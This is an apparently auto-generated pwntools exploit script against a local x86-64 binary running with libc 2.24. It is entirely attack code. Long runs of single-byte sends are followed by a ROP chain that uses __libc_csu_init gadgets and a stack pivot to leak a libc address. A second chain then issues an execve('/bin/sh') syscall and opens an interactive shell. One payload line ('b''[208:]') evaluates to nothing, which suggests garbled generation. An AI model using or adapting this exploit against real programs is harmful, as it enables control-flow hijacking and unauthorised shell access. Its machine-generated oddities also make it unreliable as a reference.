#!/usr/bin/env python3
from pwn import *
context.update(arch = 'amd64', os = 'linux', log_level = 'info')

target = ELF('./target', checksec=False)
libc_2_24_so = ELF('./libc-2.24.so', checksec=False)

__libc_csu_init = 0x401360
__libc_csu_init_call_target = 0x402e48
__libc_csu_init_gadget1 = 0x4013b6
__libc_csu_init_gadget2 = 0x4013a0
canary = 0x0
got_leak_libc_fmt_str = 0x404660
libc_2_24_so_base = 0x0
libc_2_24_so_binsh = 0x161c19
libc_2_24_so_pop_rax_ret = 0x35fc8
libc_2_24_so_pop_rdi_ret = 0x1fc6a
libc_2_24_so_pop_rdx_ret = 0x1b92
libc_2_24_so_pop_rsi_ret = 0x1fc1a
libc_2_24_so_syscall = 0x26c7
pivot_dest = 0x404860
target_base = 0x0
target_leave_ret = 0x40134f
target_pop_rbp_ret = 0x4011dd
target_pop_rdi_ret = 0x4013c3

if __name__ == '__main__':
    proc = process(['./ld-2.24.so', './target'], env={'LD_PRELOAD': './libc-2.24.so'})

    # output state
    proc.recvrepeat(0.1)

    # output state
    proc.recvrepeat(0.1)

    # output state
    proc.recvrepeat(0.1)

    # output state
    proc.recvrepeat(0.1)

    # output state
    proc.recvrepeat(0.1)

    # output state
    proc.recvrepeat(0.1)

    # output state
    proc.recvrepeat(0.1)

    # output state
    proc.recvrepeat(0.1)

    # output state
    proc.recvrepeat(0.1)

    # output state
    proc.recvrepeat(0.1)

    # output state
    proc.recvrepeat(0.1)

    # output state
    proc.recvrepeat(0.1)

    # output state
    proc.recvrepeat(0.1)

    # output state
    proc.recvrepeat(0.1)

    # output state
    proc.recvrepeat(0.1)

    # output state
    proc.recvrepeat(0.1)

    # output state
    proc.recvrepeat(0.1)

    # output state
    proc.recvrepeat(0.1)

    # output state
    proc.recvrepeat(0.1)

    # output state
    proc.recvrepeat(0.1)

    # output state
    proc.recvrepeat(0.1)

    # output state
    proc.recvrepeat(0.1)

    # output state
    proc.recvrepeat(0.1)

    # output state
    proc.recvrepeat(0.1)

    # output state
    proc.recvrepeat(0.1)

    # output state
    proc.recvrepeat(0.1)

    # input state (offset = 1)
    proc.send(b'\x80')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\xb4')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\xff')

    # input state (offset = 1)
    proc.send(b'\xfe')

    # input state (offset = 1)
    proc.send(b'\x8b')

    # input state (offset = 1)
    proc.send(b'\x7d')

    # input state (offset = 1)
    proc.send(b'\xf4')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x02')

    # input state (offset = 1)
    proc.send(b'\x92')

    # input state (offset = 1)
    proc.send(b'\xcc')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x51')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x98')

    # input state (offset = 1)
    proc.send(b'\x94')

    # input state (offset = 1)
    proc.send(b'\x7c')

    # input state (offset = 1)
    proc.send(b'\xa8')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\xda')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x02')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x03')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x03')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x03')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\xb6')

    # input state (offset = 1)
    proc.send(b'\x13')

    # input state (offset = 1)
    proc.send(b'\x40')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x01')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x60')

    # input state (offset = 1)
    proc.send(b'\x48')

    # input state (offset = 1)
    proc.send(b'\x40')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x48')

    # input state (offset = 1)
    proc.send(b'\x2e')

    # input state (offset = 1)
    proc.send(b'\x40')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\xa0')

    # input state (offset = 1)
    proc.send(b'\x13')

    # input state (offset = 1)
    proc.send(b'\x40')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\x41')

    # input state (offset = 1)
    proc.send(b'\xe0')

    # input state (offset = 1)
    proc.send(b'\x10')

    # input state (offset = 1)
    proc.send(b'\x40')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\xdd')

    # input state (offset = 1)
    proc.send(b'\x11')

    # input state (offset = 1)
    proc.send(b'\x40')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x60')

    # input state (offset = 1)
    proc.send(b'\x48')

    # input state (offset = 1)
    proc.send(b'\x40')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x4f')

    # input state (offset = 1)
    proc.send(b'\x13')

    # input state (offset = 1)
    proc.send(b'\x40')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\xe3')

    # input state (offset = 1)
    proc.send(b'\xeb')

    # input state (offset = 1)
    proc.send(b'\x03')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\xc7')

    # input state (offset = 1)
    proc.send(b'\x12')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    proc.send(b'\x00')

    # input state (offset = 1)
    # input state (rop chain begin)
    payload  = b''[208:]
    proc.sendline(payload)
    time.sleep(0.2)

    proc.recvrepeat(0)
    payload  = p64(0x0)
    payload += p64(target_base + target_pop_rdi_ret)
    payload += p64(target_base + target.got['__libc_start_main'])
    payload += p64(target_base + target.sym['puts'])
    payload += p64(target_base + __libc_csu_init_gadget1)
    payload += p64(0x4141414141414141)
    payload += p64(0x0)
    payload += p64(0x1)
    payload += p64(target_base + pivot_dest + 0xa8)
    payload += p64(0x0)
    payload += p64(0x0)
    payload += p64(target_base + __libc_csu_init_call_target)
    payload += p64(target_base + __libc_csu_init_gadget2)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(0x4141414141414141)
    payload += p64(target_base + target.sym['gets'])
    proc.sendline(payload)
    time.sleep(0.2)

    leaked = u64(proc.recv(6).ljust(8, b'\x00'))
    libc_2_24_so_base = leaked - 0x201f0
    log.info('leaked libc base: {}'.format(hex(libc_2_24_so_base)))

    payload  = p64(libc_2_24_so_base + libc_2_24_so_pop_rax_ret)
    payload += p64(0x3b)
    payload += p64(libc_2_24_so_base + libc_2_24_so_pop_rdi_ret)
    payload += p64(libc_2_24_so_base + libc_2_24_so_binsh)
    payload += p64(libc_2_24_so_base + libc_2_24_so_pop_rsi_ret)
    payload += p64(0x0)
    payload += p64(libc_2_24_so_base + libc_2_24_so_pop_rdx_ret)
    payload += p64(0x0)
    payload += p64(libc_2_24_so_base + libc_2_24_so_syscall)
    proc.sendline(payload)
    time.sleep(0.2)

    proc.interactive()
